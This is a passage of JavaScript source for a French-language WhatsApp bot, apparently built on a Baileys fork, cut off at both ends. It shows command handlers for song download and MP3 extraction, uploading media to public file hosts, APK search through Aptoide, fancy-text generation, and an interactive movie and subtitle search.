      await socket.sendMessage(sender, {
        text: `😕 Aucun résultat pour *${query}*.\n\nEssaie un autre titre.`
      }, { quoted: msg });
      break;
    }

    // ── Appel API FAA ──
    const { data: apiData } = await axios.get(
      'https://api-faa.my.id/faa/ytplayvid',
      { params: { q: video.url }, timeout: 30000 }
    );

    let result = null;
    if (apiData?.result) {
      result = Array.isArray(apiData.result) ? apiData.result[0] : apiData.result;
    } else if (Array.isArray(apiData) && apiData.length) {
      result = apiData[0];
    }

    if (!result) throw new Error('Réponse API invalide.');

    const videoUrl = result.video     || result.url_video || result.download || result.mp4 || result.url || null;
    const title    = result.title     || result.judul     || video.title;
    const thumb    = result.thumbnail || result.gambar    || video.thumbnail || null;
    const artist   = result.channel   || result.artist    || video.author?.name || 'Artiste inconnu';
    const duration = result.duration  || result.durasi    || video.timestamp    || '?';

    if (!videoUrl) throw new Error('Aucun lien vidéo retourné par l\'API.');

    // ── Téléchargement vidéo ──
    const tempVid = path.join(os.tmpdir(), `kaido_song_v_${Date.now()}.mp4`);
    const tempAud = path.join(os.tmpdir(), `kaido_song_a_${Date.now()}.mp3`);

    const writer = fs.createWriteStream(tempVid);
    const stream = await axios({
      method: 'GET',
      url: videoUrl,
      responseType: 'stream',
      timeout: 120000
    });
    stream.data.pipe(writer);
    await new Promise((resolve, reject) => {
      writer.on('finish', resolve);
      writer.on('error', reject);
    });

    // ── Extraction MP3 via ffmpeg ──
    await execPromise(`ffmpeg -y -i "${tempVid}" -vn -acodec libmp3lame -q:a 2 "${tempAud}"`);

    if (!fs.existsSync(tempAud) || fs.statSync(tempAud).size < 5000) {
      throw new Error('Extraction audio échouée.');
    }

    // ── Envoi audio avec vignette ──
    await socket.sendMessage(sender, {
      audio: fs.readFileSync(tempAud),
      mimetype: 'audio/mpeg',
      fileName: `${title.slice(0, 100)}.mp3`,
      contextInfo: {
        externalAdReply: {
          title,
          body: `🎤 ${artist}  |  ⏱ ${duration}`,
          thumbnailUrl: thumb,
          sourceUrl: video.url,
          mediaType: 1,
          renderLargerThumbnail: false
        }
      }
    }, { quoted: msg });

    // ── Confirmation ──
    await socket.sendMessage(sender, {
      text: `╭━━━━━━━━━━━━━━━━━━╮\n` +
            `┃  🎵 *DOBERTO XD MUSIC*\n` +
            `╰━━━━━━━━━━━━━━━━━━╯\n\n` +
            `📌 *${title}*\n` +
            `🎤 *Artiste :* ${artist}\n` +
            `⏱ *Durée   :* ${duration}\n\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `> ${config.BOT_FOOTER}`
    }, { quoted: msg });

    await socket.sendMessage(from, { react: { text: '✅', key: msg.key } });

  } catch (e) {
    console.error('[SONG ERROR]', e);
    await socket.sendMessage(from, { react: { text: '❌', key: msg.key } });
    await socket.sendMessage(sender, {
      text: `❌ Échec extraction audio.\n_${e.message || e}_\n\n💡 Réessaie avec un autre titre.`
    }, { quoted: msg });
  } finally {
    setTimeout(() => {
      ['kaido_song_v_', 'kaido_song_a_'].forEach(pref => {
        try {
          fs.readdirSync(os.tmpdir())
            .filter(f => f.startsWith(pref))
            .forEach(f => {
              try { fs.unlinkSync(path.join(os.tmpdir(), f)); } catch(_) {}
            });
        } catch(_) {}
      });
    }, 15000);
  }
  break;
}

      // ============================================================
// TOURL — Convertit un média en lien direct (multi-hébergeurs)
// ============================================================
case 'tourl': {
  try {
    // ── Récupérer le média cité ou le message lui-même ──
    const quotedCtx  = msg.message?.extendedTextMessage?.contextInfo;
    const quotedMsg  = quotedCtx?.quotedMessage;

    const mediaTypes = [
      'imageMessage', 'videoMessage', 'audioMessage',
      'documentMessage', 'stickerMessage'
    ];

    let mediaMsg  = null;
    let mediaType = null;

    if (quotedMsg) {
      for (const t of mediaTypes) {
        if (quotedMsg[t]) { mediaMsg = quotedMsg[t]; mediaType = t; break; }
      }
    }
    if (!mediaMsg) {
      for (const t of mediaTypes) {
        if (msg.message?.[t]) { mediaMsg = msg.message[t]; mediaType = t; break; }
      }
    }

    if (!mediaMsg || !mediaType) {
      await socket.sendMessage(sender, {
        text: `╭━━━━━━━━━━━━━━━━━━╮\n` +
              `┃  🔗 *DOBERTO XD TOURL*\n` +
              `╰━━━━━━━━━━━━━━━━━━╯\n\n` +
              `❌ Aucun média détecté !\n\n` +
              `💡 *Comment utiliser :*\n` +
              `  • Réponds à une image/vidéo/audio\n` +
              `    avec *${prefix}tourl*\n` +
              `  • Envoie un fichier avec la commande\n\n` +
              `📎 *Formats supportés :*\n` +
              `  Image, Vidéo, Audio, Document, Sticker\n\n` +
              `> ${config.BOT_FOOTER}`
      }, { quoted: msg });
      break;
    }

    await socket.sendMessage(from, { react: { text: '📤', key: msg.key } });
    await socket.sendMessage(sender, {
      text: `╭━━━━━━━━━━━━━━━━━━╮\n` +
            `┃  🔗 *DOBERTO XD TOURL*\n` +
            `╰━━━━━━━━━━━━━━━━━━╯\n\n` +
            `⏳ Téléchargement du média...\n` +
            `📤 Upload en cours...`
    }, { quoted: msg });

    // ── Téléchargement ──
    const dlType = mediaType.replace('Message', '');
    const stream = await downloadContentFromMessage(mediaMsg, dlType);
    const chunks = [];
    for await (const chunk of stream) chunks.push(chunk);
    const buffer = Buffer.concat(chunks);

    if (!buffer || buffer.length === 0) throw new Error('Téléchargement du média échoué.');

    // ── Détection type fichier ──
    const { fromBuffer } = require('file-type');
    const fileInfo = await fromBuffer(buffer);
    const mime     = fileInfo?.mime || mediaMsg.mimetype || 'application/octet-stream';
    const ext      = fileInfo?.ext  || mime.split('/')[1]?.split(';')[0] || 'bin';
    const sizeMB   = (buffer.length / (1024 * 1024)).toFixed(2);
    const fileName = `kaido_${Date.now()}.${ext}`;
    const tempPath = path.join(os.tmpdir(), fileName);

    fs.writeFileSync(tempPath, buffer);

    // ── Upload sur plusieurs hébergeurs en parallèle ──

    // 1. CatBox
    async function uploadCatBox() {
      const form = new FormData();
      form.append('fileToUpload', fs.createReadStream(tempPath), fileName);
      form.append('reqtype', 'fileupload');
      form.append('userhash', '');
      const { data } = await axios.post('https://catbox.moe/user/api.php', form, {
        headers: form.getHeaders(),
        timeout: 30000
      });
      if (!data || !data.startsWith('https')) throw new Error('CatBox: réponse invalide');
      return data.trim();
    }

    // 2. Tmpfiles.org
    async function uploadTmpFiles() {
      const form = new FormData();
      form.append('file', fs.createReadStream(tempPath), fileName);
      const { data } = await axios.post('https://tmpfiles.org/api/v1/upload', form, {
        headers: form.getHeaders(),
        timeout: 30000
      });
      if (!data?.data?.url) throw new Error('TmpFiles: réponse invalide');
      return data.data.url.replace('tmpfiles.org/', 'tmpfiles.org/dl/');
    }

    // 3. 0x0.st
    async function upload0x0() {
      const form = new FormData();
      form.append('file', fs.createReadStream(tempPath), fileName);
      const { data } = await axios.post('https://0x0.st', form, {
        headers: form.getHeaders(),
        timeout: 30000
      });
      if (!data || !data.startsWith('https')) throw new Error('0x0: réponse invalide');
      return data.trim();
    }

    // 4. Uguu.se
    async function uploadUguu() {
      const form = new FormData();
      form.append('files[]', fs.createReadStream(tempPath), fileName);
      const { data } = await axios.post('https://uguu.se/upload', form, {
        headers: form.getHeaders(),
        timeout: 30000
      });
      if (!data?.files?.[0]?.url) throw new Error('Uguu: réponse invalide');
      return data.files[0].url;
    }

    // ── Lancer tous les uploads en parallèle ──
    const results = await Promise.allSettled([
      uploadCatBox(),
      uploadTmpFiles(),
      upload0x0(),
      uploadUguu()
    ]);

    // Nettoyage fichier temp
    setTimeout(() => {
      try { if (fs.existsSync(tempPath)) fs.unlinkSync(tempPath); } catch(_) {}
    }, 5000);

    const catbox   = results[0].status === 'fulfilled' ? results[0].value : null;
    const tmpfiles = results[1].status === 'fulfilled' ? results[1].value : null;
    const ox0      = results[2].status === 'fulfilled' ? results[2].value : null;
    const uguu     = results[3].status === 'fulfilled' ? results[3].value : null;

    // Au moins un doit avoir réussi
    if (!catbox && !tmpfiles && !ox0 && !uguu) {
      throw new Error('Tous les hébergeurs ont échoué. Réessaie dans quelques secondes.');
    }

    // ── Réponse stylée ──
    let txt = `╭━━━━━━━━━━━━━━━━━━╮\n` +
              `┃  🔗 *DOBERTO XD TOURL*\n` +
              `╰━━━━━━━━━━━━━━━━━━╯\n\n` +
              `✅ *Upload terminé !*\n\n` +
              `📎 *Type :* ${mime}\n` +
              `📦 *Taille :* ${sizeMB} MB\n` +
              `━━━━━━━━━━━━━━━━━━\n\n` +
              `🔗 *Liens directs :*\n\n`;

    if (catbox)   txt += `🟠 *CatBox :*\n${catbox}\n\n`;
    if (tmpfiles) txt += `🟣 *TmpFiles :*\n${tmpfiles}\n\n`;
    if (ox0)      txt += `⚫ *0x0.st :*\n${ox0}\n\n`;
    if (uguu)     txt += `🔵 *Uguu.se :*\n${uguu}\n\n`;

    txt += `━━━━━━━━━━━━━━━━━━\n> ${config.BOT_FOOTER}`;

    await socket.sendMessage(sender, { text: txt }, { quoted: msg });
    await socket.sendMessage(from, { react: { text: '✅', key: msg.key } });

  } catch (e) {
    console.error('[TOURL ERROR]', e);
    await socket.sendMessage(from, { react: { text: '❌', key: msg.key } });
    await socket.sendMessage(sender, {
      text: `╭━━━━━━━━━━━━━━━━━━╮\n` +
            `┃  🔗 *DOBERTO XD TOURL*\n` +
            `╰━━━━━━━━━━━━━━━━━━╯\n\n` +
            `❌ Échec de l'upload.\n\n` +
            `_${e.message || e}_\n\n` +
            `💡 Réessaie dans quelques secondes.\n\n` +
            `> ${config.BOT_FOOTER}`
    }, { quoted: msg });
  }
  break;
}
      // ============================================================
// MODAPK — Téléchargement APK via Aptoide Scraper
// ============================================================
// ============================================================
// MODAPK — Téléchargement APK direct via API Aptoide
// ============================================================
case 'modapk': {
  try {
    if (!args.length) {
      await socket.sendMessage(sender, {
        text: `╭━━━━━━━━━━━━━━━━━━╮\n` +
              `┃  📦 *DOBERTO XD MOD APK*\n` +
              `╰━━━━━━━━━━━━━━━━━━╯\n\n` +
              `❌ Aucun nom d'application fourni !\n\n` +
              `*Usage :* ${prefix}modapk <nom app>\n\n` +
              `*Exemples :*\n` +
              `  ${prefix}modapk Spotify\n` +
              `  ${prefix}modapk Minecraft\n` +
              `  ${prefix}modapk Instagram\n\n` +
              `> ${config.BOT_FOOTER}`
      }, { quoted: msg });
      break;
    }

    const query = args.join(' ').trim();

    await socket.sendMessage(from, { react: { text: '🔍', key: msg.key } });
    await socket.sendMessage(sender, {
      text: `╭━━━━━━━━━━━━━━━━━━╮\n` +
            `┃  📦 *DOBERTO XD MOD APK*\n` +
            `╰━━━━━━━━━━━━━━━━━━╯\n\n` +
            `🔍 Recherche : *${query}*\n` +
            `⏳ Connexion à Aptoide...`
    }, { quoted: msg });

    // ── Recherche via API Aptoide directe ──
    const { data: searchData } = await axios.get(
      `https://ws75.aptoide.com/api/7/apps/search/query=${encodeURIComponent(query)}/limit=1`,
      { timeout: 15000 }
    );

    if (!searchData?.datalist?.list?.length) {
      await socket.sendMessage(from, { react: { text: '❌', key: msg.key } });
      await socket.sendMessage(sender, {
        text: `╭━━━━━━━━━━━━━━━━━━╮\n` +
              `┃  📦 *DOBERTO XD MOD APK*\n` +
              `╰━━━━━━━━━━━━━━━━━━╯\n\n` +
              `😕 Aucune application trouvée pour\n*${query}*\n\n` +
              `💡 Vérifie l'orthographe et réessaie.\n\n` +
              `> ${config.BOT_FOOTER}`
      }, { quoted: msg });
      break;
    }

    const app = searchData.datalist.list[0];

    const name    = app.name                || query;
    const dlLink  = app.file?.path          || null;
    const sizeMB  = app.file?.filesize
      ? parseFloat((app.file.filesize / (1024 * 1024)).toFixed(1))
      : null;
    const sizeStr = sizeMB ? `${sizeMB} MB` : 'Inconnue';
    const version = app.file?.vername       || null;
    const rating  = app.stats?.rating?.avg  || null;
    const pkg     = app.package_name        || null;
    const icon    = app.icon                || null;
    const dev     = app.store?.name         || null;

    if (!dlLink) {
      throw new Error('Lien de téléchargement introuvable pour cette application.');
    }

    // ── Vérification taille ──
    if (sizeMB && sizeMB > 200) {
      await socket.sendMessage(from, { react: { text: '⛔', key: msg.key } });
      await socket.sendMessage(sender, {
        text: `╭━━━━━━━━━━━━━━━━━━╮\n` +
              `┃  📦 *DOBERTO XD MOD APK*\n` +
              `╰━━━━━━━━━━━━━━━━━━╯\n\n` +
              `⛔ *Fichier trop volumineux !*\n\n` +
              `📦 App     : *${name}*\n` +
              `📊 Taille  : *${sizeStr}*\n\n` +
              `💡 WhatsApp limite les fichiers à 200 MB.\n\n` +
              `> ${config.BOT_FOOTER}`
      }, { quoted: msg });
      break;
    }

    // ── Confirmation avant envoi ──
    await socket.sendMessage(from, { react: { text: '⬇️', key: msg.key } });

    // Envoyer l'icône + infos en aperçu
    if (icon) {
      await socket.sendMessage(sender, {
        image: { url: icon },
        caption: `╭━━━━━━━━━━━━━━━━━━╮\n` +
                 `┃  📦 *DOBERTO XD MOD APK*\n` +
                 `╰━━━━━━━━━━━━━━━━━━╯\n\n` +
                 `✅ *Application trouvée !*\n\n` +
                 `📦 *${name}*\n` +
                 (pkg     ? `🔖 Package : ${pkg}\n`      : '') +
                 (version ? `🏷️ Version : ${version}\n`  : '') +
                 (dev     ? `🏢 Store   : ${dev}\n`      : '') +
                 `📊 Taille  : ${sizeStr}\n` +
                 (rating  ? `⭐ Note    : ${rating}/5\n` : '') +
                 `\n📲 Envoi APK en cours...`
      }, { quoted: msg });
    } else {
      await socket.sendMessage(sender, {
        text: `╭━━━━━━━━━━━━━━━━━━╮\n` +
              `┃  📦 *DOBERTO XD MOD APK*\n` +
              `╰━━━━━━━━━━━━━━━━━━╯\n\n` +
              `✅ *Application trouvée !*\n\n` +
              `📦 *${name}*\n` +
              (version ? `🏷️ Version : ${version}\n`  : '') +
              `📊 Taille  : ${sizeStr}\n` +
              `\n📲 Envoi APK en cours...`
      }, { quoted: msg });
    }

    // ── Envoi APK ──
    const fileName = `${name.replace(/[^a-zA-Z0-9]/g, '_')}_BaseBotMD.apk`;

    await socket.sendMessage(sender, {
      document: { url: dlLink },
      mimetype: 'application/vnd.android.package-archive',
      fileName,
      caption: `╭━━━━━━━━━━━━━━━━━━╮\n` +
               `┃  📦 *DOBERTO XD MOD APK*\n` +
               `╰━━━━━━━━━━━━━━━━━━╯\n\n` +
               `📦 *${name}*\n` +
               (version ? `🏷️ Version : ${version}\n`  : '') +
               `📊 Taille  : ${sizeStr}\n` +
               (rating  ? `⭐ Note    : ${rating}/5\n` : '') +
               `\n━━━━━━━━━━━━━━━━━━\n` +
               `> ${config.BOT_FOOTER}`
    }, { quoted: msg });

    await socket.sendMessage(from, { react: { text: '✅', key: msg.key } });

  } catch (e) {
    console.error('[MODAPK ERROR]', e);
    await socket.sendMessage(from, { react: { text: '❌', key: msg.key } });
    await socket.sendMessage(sender, {
      text: `╭━━━━━━━━━━━━━━━━━━╮\n` +
            `┃  📦 *DOBERTO XD MOD APK*\n` +
            `╰━━━━━━━━━━━━━━━━━━╯\n\n` +
            `❌ Échec du téléchargement.\n\n` +
            `_${e.message || 'Erreur inconnue.'}_\n\n` +
            `💡 Vérifie le nom de l'application.\n\n` +
            `> ${config.BOT_FOOTER}`
    }, { quoted: msg });
  }
  break;
}
      // ============================================================
// SHAZAM — Identification musicale via ACRCloud
// ============================================================
case 'shazam': {
  // ── DEZAKTIVE pou ekonomize memwa sou Render Free (ACRCloud pa chaje ankò) ──
  await socket.sendMessage(sender, {
    text: `╭━━━━━━━━━━━━━━━━━━╮\n` +
          `┃  🎵 *DOBERTO XD SHAZAM*\n` +
          `╰━━━━━━━━━━━━━━━━━━╯\n\n` +
          `⚠️ Fonksyon rekonesans mizik la dezaktive pou kounye a\n` +
          `pou ekonomize resous sèvè a.\n\n` +
          `> ${config.BOT_FOOTER}`
  }, { quoted: msg });
  break;
}
      
      
case 'fancy': {
  try {
    if (!args.length) {
      await socket.sendMessage(sender, {
        text: `╭━━━━━━━━━━━━━━━━━━╮\n` +
              `┃  ✨ *DOBERTO XD FANCY TEXT*\n` +
              `╰━━━━━━━━━━━━━━━━━━╯\n\n` +
              `❌ Aucun texte fourni !\n\n` +
              `*Usage :*\n` +
              `  ${prefix}fancy <texte>\n` +
              `  ${prefix}fancy <texte> <numéro>\n\n` +
              `*Exemples :*\n` +
              `  ${prefix}fancy BaseBot MD\n` +
              `  ${prefix}fancy BaseBot MD 3\n\n` +
              `> ${config.BOT_FOOTER}`
      }, { quoted: msg });
      break;
    }

    const lastArg = args[args.length - 1];
    const styleNum = /^\d+$/.test(lastArg) ? parseInt(lastArg) : null;
    const inputText = styleNum !== null
      ? args.slice(0, -1).join(' ').trim()
      : args.join(' ').trim();

    if (!inputText) {
      await socket.sendMessage(sender, {
        text: `❌ Texte manquant.\n*Usage :* ${prefix}fancy <texte> [numéro]`
      }, { quoted: msg });
      break;
    }

    await socket.sendMessage(from, { react: { text: '✨', key: msg.key } });

    const res = await fetch(
      `http://qaz.wtf/u/convert.cgi?text=${encodeURIComponent(inputText)}`,
      { timeout: 15000 }
    );
    if (!res.ok) throw new Error(`Erreur serveur : ${res.status}`);
    const html = await res.text();

    function decodeHtmlEntities(str) {
      return str
        .replace(/&#x([0-9a-fA-F]+);/g, (_, hex) => String.fromCodePoint(parseInt(hex, 16)))
        .replace(/&#(\d+);/g, (_, dec) => String.fromCodePoint(parseInt(dec, 10)))
        .replace(/&amp;/g, '&')
        .replace(/&lt;/g, '<')
        .replace(/&gt;/g, '>')
        .replace(/&nbsp;/g, ' ');
    }

    const styles = [];
    const rows = html.match(/<tr[\s\S]*?<\/tr>/gi) || [];

    for (const row of rows) {
      const nameMatch = row.match(/class=["']aname["'][^>]*>([\s\S]*?)<\/(?:td|span|div)>/i);
      if (!nameMatch) continue;
      const name = nameMatch[1].replace(/<[^>]+>/g, '').trim();
      if (!name) continue;

      const tdMatches = [...row.matchAll(/<td[^>]*>([\s\S]*?)<\/td>/gi)];
      if (tdMatches.length < 2) continue;

      const content = decodeHtmlEntities(
        tdMatches[1][1].replace(/<[^>]+>/g, '').trim()
      );
      if (!content) continue;

      styles.push(content); // on stocke uniquement le contenu, pas le nom
    }

    if (!styles.length) throw new Error('Aucun style généré.');

    // ── Mode style unique ──
    if (styleNum !== null) {
      const idx = styleNum - 1;
      if (idx < 0 || idx >= styles.length) {
        await socket.sendMessage(sender, {
          text: `❌ Numéro invalide ! Choisis entre *1* et *${styles.length}*.\n\n` +
                `*Exemple :* ${prefix}fancy ${inputText} 5`
        }, { quoted: msg });
        break;
      }

      await socket.sendMessage(sender, {
        text: `╭━━━━━━━━━━━━━━━━━━╮\n` +
              `┃  ✨ *DOBERTO XD FANCY TEXT*\n` +
              `╰━━━━━━━━━━━━━━━━━━╯\n\n` +
              `${styles[idx]}\n\n` +
              `━━━━━━━━━━━━━━━━━━\n` +
              `> ${config.BOT_FOOTER}`
      }, { quoted: msg });

      await socket.sendMessage(from, { react: { text: '✅', key: msg.key } });
      break;
    }

    // ── Mode tous les styles — un seul message ──
    const lines = styles.map((s, i) => `*${i + 1}.* ${s}`).join('\n');

    await socket.sendMessage(sender, {
      text: `╭━━━━━━━━━━━━━━━━━━╮\n` +
            `┃  ✨ *DOBERTO XD FANCY TEXT*\n` +
            `╰━━━━━━━━━━━━━━━━━━╯\n\n` +
            `🔤 *${inputText}* — ${styles.length} styles\n` +
            `━━━━━━━━━━━━━━━━━━\n\n` +
            `${lines}\n\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `💡 ${prefix}fancy ${inputText} <numéro>\n` +
            `> ${config.BOT_FOOTER}`
    }, { quoted: msg });

    await socket.sendMessage(from, { react: { text: '✅', key: msg.key } });

  } catch (e) {
    console.error('[FANCY ERROR]', e);
    await socket.sendMessage(from, { react: { text: '❌', key: msg.key } });
    await socket.sendMessage(sender, {
      text: `❌ Erreur fancy text.\n_${e.message || e}_`
    }, { quoted: msg });
  }
  break;
}
// ============================================================
// APK — Recherche avec carrousel interactif (elaina-baileys)
// ============================================================
case 'apk': {
  try {
    if (!args.length) {
      await socket.sendMessage(sender, {
        text: `╭━━━━━━━━━━━━━━━━━━╮\n` +
              `┃  🛒 *DOBERTO XD APK STORE*\n` +
              `╰━━━━━━━━━━━━━━━━━━╯\n\n` +
              `❌ Aucun nom d'application fourni !\n\n` +
              `*Usage :* ${prefix}apk <nom app>\n\n` +
              `*Exemples :*\n` +
              `  ${prefix}apk WhatsApp\n` +
              `  ${prefix}apk Minecraft\n` +
              `  ${prefix}apk TikTok\n\n` +
              `> ${config.BOT_FOOTER}`
      }, { quoted: msg });
      break;
    }

    const query = args.join(' ').trim();

    await socket.sendMessage(from, { react: { text: '🔎', key: msg.key } });
    await socket.sendMessage(sender, {
      text: `╭━━━━━━━━━━━━━━━━━━╮\n` +
            `┃  🛒 *DOBERTO XD APK STORE*\n` +
            `╰━━━━━━━━━━━━━━━━━━╯\n\n` +
            `🔎 Recherche : *${query}*\n` +
            `⏳ Connexion aux serveurs APK...`
    }, { quoted: msg });

    const {
      prepareWAMessageMedia,
      generateWAMessageFromContent,
      proto
    } = require('@rexxhayanasi/elaina-baileys');

    // ── Appel API Aptoide ──
    const { data } = await axios.get(
      `https://ws75.aptoide.com/api/7/apps/search/query=${encodeURIComponent(query)}/limit=5`,
      { timeout: 15000 }
    );

    if (!data?.datalist?.list?.length) {
      await socket.sendMessage(from, { react: { text: '❌', key: msg.key } });
      await socket.sendMessage(sender, {
        text: `😕 Aucune application trouvée pour *${query}*.\n\n💡 Vérifie l'orthographe et réessaie.`
      }, { quoted: msg });
      break;
    }

    const FALLBACK_ICON = '';
    const cards = [];

    for (const app of data.datalist.list) {
      const title   = (app.name || 'Application').slice(0, 40);
      const dev     = app.store?.name || 'Global Store';
      const version = app.file?.vername || '1.0';
      const sizeMB  = app.file?.filesize
        ? (app.file.filesize / (1024 * 1024)).toFixed(1)
        : '?';
      const dlLink  = app.file?.path;
      const rating  = app.stats?.rating?.avg || 'N/A';
      const iconUrl = app.icon || FALLBACK_ICON;

      if (!dlLink) continue;

      // ── Téléchargement icône avec fallback ──
      let imgBuffer;
      try {
        const r = await axios.get(iconUrl, { responseType: 'arraybuffer', timeout: 6000 });
        imgBuffer = Buffer.from(r.data);
      } catch {
        const r = await axios.get(FALLBACK_ICON, { responseType: 'arraybuffer', timeout: 6000 });
        imgBuffer = Buffer.from(r.data);
      }

      // ── Upload image via Baileys ──
      const media = await prepareWAMessageMedia(
        { image: imgBuffer },
        { upload: socket.waUploadToServer }
      );

      const btnId = `${prefix}dlapk ${title.replace(/\s+/g, '_')} ${dlLink}`;

      // ── Card = plain object, PAS de proto.create() ──
      cards.push({
        body: { text: `🏢 *Store :* ${dev}\n🏷️ *Version :* ${version}\n📦 *Taille :* ${sizeMB} MB\n⭐ *Note :* ${rating}/5` },
        header: {
          title: `📦 ${title}`,
          hasMediaAttachment: true,
          imageMessage: media.imageMessage
        },
        nativeFlowMessage: {
          buttons: [
            {
              name: 'quick_reply',
              buttonParamsJson: JSON.stringify({
                display_text: `📥 Télécharger (${sizeMB} MB)`,
                id: btnId
              })
            }
          ]
        }
      });
    }

    if (!cards.length) {
      throw new Error('Aucun lien de téléchargement disponible pour ces applications.');
    }

    // ── Construction carrousel avec proto.create() uniquement sur les niveaux existants ──
    const interactiveMsg = proto.Message.InteractiveMessage.create({
      body: proto.Message.InteractiveMessage.Body.create({
        text: `🛒 *DOBERTO XD APK STORE*\n━━━━━━━━━━━━━━━━━━\n🔎 Résultats : *${query}*\n👆 Swipe pour choisir ➡️`
      }),
      footer: proto.Message.InteractiveMessage.Footer.create({
        text: `> ${config.BOT_FOOTER}`
      }),
      carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.create({
        cards,           // ← plain objects ici
        messageVersion: 1
      })
    });

    const waMsg = generateWAMessageFromContent(
      from,
      {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2
            },
            interactiveMessage: interactiveMsg
          }
        }
      },
      { quoted: msg, userJid: socket.user.id }
    );

    await socket.relayMessage(from, waMsg.message, { messageId: waMsg.key.id });
    await socket.sendMessage(from, { react: { text: '✅', key: msg.key } });

  } catch (e) {
    console.error('[APK ERROR]', e);
    await socket.sendMessage(from, { react: { text: '❌', key: msg.key } });
    await socket.sendMessage(sender, {
      text: `❌ Erreur APK Store.\n_${e.message || e}_\n\n💡 Réessaie dans quelques secondes.`
    }, { quoted: msg });
  }
  break;
}      
      
      
// === COMMANDE RECHERCHE DE FILMS ===
case 'movie': {
    try {
        const query = args.join(" ");
        if (!query) {
            await socket.sendMessage(sender, { 
                text: `🎥 *Usage:* ${prefix}${command} <nom du film>\n*Exemple:* ${prefix}${command} Batman` 
            }, { quoted: msg });
            break;
        }

        await socket.sendMessage(jid, { react: { text: '🔎', key: msg.key } });
        await socket.sendMessage(sender, { 
            text: `🔎 *Recherche de films pour :* "${query}"...\n_Génération des cartes de sélection..._` 
        }, { quoted: msg });

        const axios = require('axios');
        
        const { data } = await axios.get(`https://darkvibe314-silent-movies-api.hf.space/api/search`, {
            params: { query: query },
            timeout: 30000
        });

        if (!data.results || data.results.length === 0) {
            await socket.sendMessage(sender, { 
                text: "🩸 *Aucun film trouvé !* Essaie un autre terme de recherche." 
            }, { quoted: msg });
            break;
        }

        const results = data.results.slice(0, 5); // 5 max pour le carousel WA
        const cards = [];

        // Initialiser le cache des sous-titres si nécessaire
        if (!global.movieSubCache) global.movieSubCache = {};

        for (let i = 0; i < results.length; i++) {
            const movie = results[i];
            const title = (movie.title || "Inconnu").slice(0, 50);
            const isSeries = movie.subjectType === 2; 

            // Stocker les sous-titres dans le cache global
            global.movieSubCache[movie.subjectId] = movie.subtitles || "None";
            
            const subText = movie.subtitles ? movie.subtitles.split(',').slice(0, 3).join(', ') + "..." : 'Aucun';
            const desc = `⭐ IMDb: ${movie.imdbRatingValue || 'N/A'}\n` +
                        `🎭 Genre: ${movie.genre || 'N/A'}\n` +
                        `📅 Année: ${movie.releaseDate?.split('-')[0] || 'Inconnue'}\n` +
                        `📌 Type: ${isSeries ? 'Série 📺' : 'Film 🎬'}\n` +
                        `💬 Sous-titres: ${subText}`;
            
            const coverUrl = movie.cover?.url || '';

            // Préparer le média pour l'image
            const { generateWAMessageContent, generateWAMessageFromContent, proto } = require('@rexxhayanasi/elaina-baileys');
            
            const media = await generateWAMessageContent({
                image: { url: coverUrl }
            }, { upload: socket.waUploadToServer });

            let actionButtons = [];
            
            if (isSeries) {
                actionButtons.push({ 
                    name: "quick_reply", 
                    buttonParamsJson: JSON.stringify({ display_text: "📺 Télécharger (Défaut)", id: `.dlmovie ${movie.subjectId} 1 1` }) 
                });
                actionButtons.push({ 
                    name: "quick_reply", 
                    buttonParamsJson: JSON.stringify({ display_text: "📝 Choisir sous-titres", id: `.smsubs ${movie.subjectId} 1 1` }) 
                });
                actionButtons.push({ 
                    name: "cta_copy", 
                    buttonParamsJson: JSON.stringify({ 
                        display_text: "📋 Copier ID", 
                        id: "copy_id", 
                        copy_code: `.dlmovie ${movie.subjectId} <saison> <épisode> <Langue>` 
                    }) 
                });
            } else {
                actionButtons.push({ 
                    name: "quick_reply", 
                    buttonParamsJson: JSON.stringify({ display_text: "🎬 Télécharger (Défaut)", id: `.dlmovie ${movie.subjectId} null null` }) 
                });
                actionButtons.push({ 
                    name: "quick_reply", 
                    buttonParamsJson: JSON.stringify({ display_text: "📝 Choisir sous-titres", id: `.smsubs ${movie.subjectId} null null` }) 
                });
            }

            cards.push({
                body: { text: desc },
                header: { 
                    title: `🎬 ${title}`, 
                    hasMediaAttachment: true, 
                    imageMessage: media.imageMessage 
                },
                nativeFlowMessage: { buttons: actionButtons }
            });
        }

        // Créer le message interactif avec carousel
        const { generateWAMessageFromContent, proto } = require('@rexxhayanasi/elaina-baileys');
        
        const interactiveMessage = {
            body: { text: `🎥 *Résultats pour :* ${query}\n\nGlisse pour choisir ! ➡️` },
            carouselMessage: { cards: cards, messageVersion: 1 }
        };

        const msgContent = generateWAMessageFromContent(jid, {
            viewOnceMessage: { 
                message: { 
                    messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 }, 
                    interactiveMessage: interactiveMessage 
                } 
            }
        }, { quoted: msg, userJid: sender });

        await socket.relayMessage(jid, msgContent.message, { messageId: msgContent.key.id });
        await socket.sendMessage(jid, { react: { text: '✅', key: msg.key } });

    } catch (e) {
        console.error("[MOVIE SEARCH ERROR]", e.message);
        await socket.sendMessage(sender, { 
            text: `🩸 Erreur de recherche: ${e.response?.data?.detail || e.message}` 
        }, { quoted: msg });
        await socket.sendMessage(jid, { react: { text: '❌', key: msg.key } });
    }
    break;
}

// === COMMANDE SOUS-TITRES ===
case 'smsubs': {
    try {
        const movieId = args[0];
        const season = args[1] === 'null' ? null : args[1];
        const episode = args[2] === 'null' ? null : args[2];
        
        if (!movieId) {
            await socket.sendMessage(sender, { 
                text: "🩸 *Usage:* `.smsubs <movie_id> [saison] [épisode]`" 
            }, { quoted: msg });
            break;
        }
        
        const cachedSubs = global.movieSubCache?.[movieId];
        if (!cachedSubs || cachedSubs === 'None') {
            await socket.sendMessage(sender, { 
                text: "🩸 Aucun sous-titre disponible pour ce média." 
            }, { quoted: msg });
            break;
        }

        const subList = cachedSubs.split(',').map(s => s.trim());
        
        const rows = subList.map(sub => ({
            header: "",
            title: `📝 ${sub}`,
            description: `Télécharger avec sous-titres ${sub}`,
            id: `.dlmovie ${movieId} ${season || 'null'} ${episode || 'null'} ${sub}`
        }));

        const sections = [{ title: "Langues disponibles", rows: rows }];

        const { generateWAMessageFromContent, proto } = require('@rexxhayanasi/elaina-baileys');
        
        const interactiveMsg = generateWAMessageFromContent(jid, {
            viewOnceMessage: {
                message: {
                    messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
